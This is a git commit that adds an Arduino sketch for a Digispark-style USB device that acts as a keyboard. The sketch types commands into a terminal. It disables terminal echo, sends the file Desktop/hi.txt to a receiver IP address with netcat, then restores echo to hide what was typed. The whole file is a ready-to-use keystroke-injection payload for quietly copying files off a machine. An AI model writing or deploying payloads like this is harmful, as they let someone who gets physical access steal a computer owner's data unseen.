2cce4be7572be7286886aecccd51e910a348d537
AnushkaMenon <30318462+AnushkaMenon@users.noreply.github.com>
2020-04-14 01:49:01 +1000

    Create send_single_file_ubuntu_server.ino

---
+++ transfer_files/send_single_file_ubuntu_server.ino
@@ -0,0 +1,34 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  // put your setup code here, to run once:
+
+}
+
+bool finished = false;
+void loop() {
+  if (not finished) {
+    DigiKeyboard.sendKeyStroke(0);
+    
+    // disable terminal echoing
+    DigiKeyboard.print("stty -echo");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(1000);
+    
+    // send the file 'hi.txt' to your computer
+    //  ** replace the IP address below with your computer's IP address **
+    DigiKeyboard.print("nc [receiver's IP address here] 1234 < Desktop/hi.txt");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(3000);
+    
+    // quit process if it hasn't quit already
+    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
+    DigiKeyboard.delay(500);
+    
+    // re-enable terminal echoing
+    DigiKeyboard.print("stty echo");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    
+    finished = true;
+  }
+}
